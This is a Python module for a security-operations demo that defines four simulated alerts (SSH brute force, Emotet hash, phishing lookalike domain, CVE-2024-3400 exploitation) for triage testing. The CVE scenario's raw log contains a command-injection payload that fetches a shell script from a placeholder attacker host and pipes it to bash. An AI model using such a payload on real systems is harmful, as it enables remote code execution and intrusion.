"""AEGIS SOC — Alert Simulator (demo scenarios with known-malicious IOCs)"""

DEMO_SCENARIOS = {
    "suspicious_ip": {
        "source": "siem",
        "title": "Suspicious External IP Login Detected",
        "description": "Multiple failed SSH login attempts followed by successful authentication from known malicious IP. Unusual login time (03:42 UTC) from geo-location inconsistent with user profile.",
        "alert_type": "suspicious_ip",
        "severity_hint": "high",
        "source_ip": "45.33.32.156",
        "destination_ip": "10.0.1.50",
        "hostname": "prod-web-01",
        "user": "admin",
        "raw_log": "sshd[12345]: Failed password for admin from 45.33.32.156 port 22 ssh2\nsshd[12345]: Accepted password for admin from 45.33.32.156 port 22 ssh2",
    },
    "malware_hash": {
        "source": "edr",
        "title": "Known Malware Binary Detected on Endpoint",
        "description": "Endpoint detection triggered on suspicious executable. File matches known Emotet trojan signature. Process attempted to establish outbound connection.",
        "alert_type": "malware_hash",
        "severity_hint": "critical",
        "file_hash": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
        "source_ip": "10.0.2.100",
        "destination_ip": "185.220.101.1",
        "hostname": "workstation-042",
        "user": "j.smith",
        "raw_log": "ALERT: Malicious file detected. SHA256: ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa. Process: update.exe. Outbound connection to 185.220.101.1:443",
    },
    "phishing_email": {
        "source": "email_gateway",
        "title": "Phishing Email with Malicious Link Detected",
        "description": "Email from spoofed sender containing link to credential harvesting page. URL mimics corporate login portal.",
        "alert_type": "phishing",
        "severity_hint": "high",
        "email_sender": "support@micr0soft-security.com",
        "domain": "micr0soft-security.com",
        "url": "https://micr0soft-security.com/login/verify",
        "hostname": "mail-gw-01",
        "user": "finance-team",
    },
    "cve_exploit": {
        "source": "waf",
        "title": "CVE-2024-3400 Exploitation Attempt Detected",
        "description": "Web application firewall detected exploitation attempt targeting PAN-OS GlobalProtect CVE-2024-3400 (command injection). Attacker attempting remote code execution.",
        "alert_type": "cve_exploit",
        "severity_hint": "critical",
        "cve_id": "CVE-2024-3400",
        "source_ip": "103.152.220.44",
        "destination_ip": "10.0.0.1",
        "hostname": "fw-edge-01",
        "raw_log": "WAF BLOCK: POST /global-protect/login.esp HTTP/1.1 | Payload: ;curl+attacker.com/shell.sh|bash",
    },
}

def get_demo_alert(scenario: str) -> dict:
    """Get a pre-built demo alert by scenario name."""
    return DEMO_SCENARIOS.get(scenario, DEMO_SCENARIOS["suspicious_ip"])

def list_scenarios() -> list[str]:
    return list(DEMO_SCENARIOS.keys())
